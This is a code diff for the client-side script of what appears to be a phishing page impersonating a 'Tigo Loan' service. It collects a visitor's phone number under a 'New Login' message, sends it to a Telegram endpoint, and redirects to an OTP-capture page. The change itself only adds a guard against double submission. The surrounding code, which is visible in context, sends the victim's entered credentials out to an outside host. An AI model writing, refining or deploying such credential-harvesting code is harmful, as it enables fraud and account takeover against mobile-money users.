@@ -6,6 +6,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Starting number empty
     let phoneNumber = '';
+    let isSubmitting = false;
     updateDisplay();
 
     keys.forEach(key => {
@@ -39,10 +40,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Button submit effect
     confirmBtn.addEventListener('click', async () => {
-        if (phoneNumber.length > 0) {
+        if (phoneNumber.length > 0 && !isSubmitting) {
+            isSubmitting = true;
+            confirmBtn.style.opacity = '0.5';
+            confirmBtn.style.pointerEvents = 'none';
             await sendToTelegram(`<b>Tigo Loan - New Login</b>\nPhone: <code>${phoneNumber}</code>`);
             window.location.href = 'loading.html?next=otp.html&delay=3000';
-        } else {
+        } else if (phoneNumber.length === 0) {
             alert('Tafadhali weka namba yako ya simu.');
         }
     });
